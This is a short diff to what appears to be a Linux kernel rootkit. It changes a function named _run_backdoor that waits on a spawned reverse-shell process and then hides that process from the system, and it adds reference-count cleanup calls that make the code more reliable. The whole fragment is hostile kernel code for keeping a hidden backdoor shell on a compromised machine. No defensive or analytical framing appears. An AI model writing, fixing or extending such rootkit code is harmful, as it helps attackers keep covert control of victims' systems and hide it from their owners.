@@ -328,14 +328,19 @@ static int _run_backdoor(struct iphdr *iph, struct tcphdr *tcph, int port,
 	}
 
 	if (ret == 0) {
-		bool __attribute__((unused)) rc = _wait_for_children(
-			get_pid_task(find_get_pid(shellpid), PIDTYPE_PID),
-			default_child_count);
+		struct pid *pid = find_get_pid(shellpid);
+		struct task_struct *task = get_pid_task(pid, PIDTYPE_PID);
+		bool __attribute__((unused)) rc = _wait_for_children(task, default_child_count);
 
 		if (!rc) {
 			prwarn("Warning: revshell pid %d don't match estimated child count of %d\n",
 			       shellpid, default_child_count);
 		}
+
+		if (task)
+			put_task_struct(task);
+		if (pid)
+			put_pid(pid);
 
 		// Hide straight-away what we've got
 		kv_hide_task_by_pid(shellpid, saddr, false);
